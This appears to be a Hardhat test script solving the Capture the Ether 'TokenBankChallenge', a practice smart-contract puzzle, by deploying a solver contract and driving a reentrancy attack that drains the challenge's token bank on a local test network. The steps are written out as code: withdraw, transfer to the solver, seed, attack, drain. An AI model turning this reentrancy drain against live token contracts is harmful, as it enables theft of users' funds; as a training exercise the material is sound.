import { ethers } from "hardhat";
import { expect } from "chai";

import { network } from "hardhat";

beforeEach(async () => {
  await network.provider.send("hardhat_reset");
});

describe("CaptureTheEther - TokenBankChallenge", function () {
  it("Should drain the TokenBankChallenge using reentrancy", async function () {
    const [player] = await ethers.getSigners();

    const ChallengeFactory = await ethers.getContractFactory(
      "contracts/TokenBankChallenge.sol:TokenBankChallenge"
    );
    const challenge = await ChallengeFactory.connect(player).deploy(player.address);
    await challenge.waitForDeployment();

    const tokenAddress = await challenge.token();
    const TokenFactory = await ethers.getContractFactory("SimpleERC223Token");
    const token = TokenFactory.attach(tokenAddress);

    const SolverFactory = await ethers.getContractFactory("TokenBankSolver");
    const solver = await SolverFactory.connect(player).deploy(await challenge.getAddress());
    await solver.waitForDeployment();

    const amount = ethers.parseEther("500000");
    const data = "0x";

    // ✅ FIX: Withdraw tokens so the player actually owns them in the ERC223 contract
    await challenge.connect(player).withdraw(amount);

    // Step 1: Send tokens from player to solver contract
    const tx = await player.sendTransaction({
      to: tokenAddress,
      data: token.interface.encodeFunctionData("transfer(address,uint256,bytes)", [
        await solver.getAddress(),
        amount,
        data,
      ]),
    });
    await tx.wait();

    // Step 2: Seed the challenge (calls tokenFallback)
    const tx2 = await solver.connect(player).seed();
    await tx2.wait();

    // Step 3: Start the reentrancy attack
    try {
      const tx3 = await solver.connect(player).attack();
      const receipt = await tx3.wait();

      console.log("=== Events during attack ===");
      for (const log of receipt.logs) {
        try {
          const parsed = SolverFactory.interface.parseLog(log);
          //console.log(`${parsed.name}:`, parsed.args);
        } catch (_) {}
      }
    } catch (err) {
      console.error("Attack failed:", err);
    }

    // Step 4: Drain any remaining tokens
    await solver.connect(player).drain();

    expect(await challenge.isComplete()).to.be.true;
  });
});
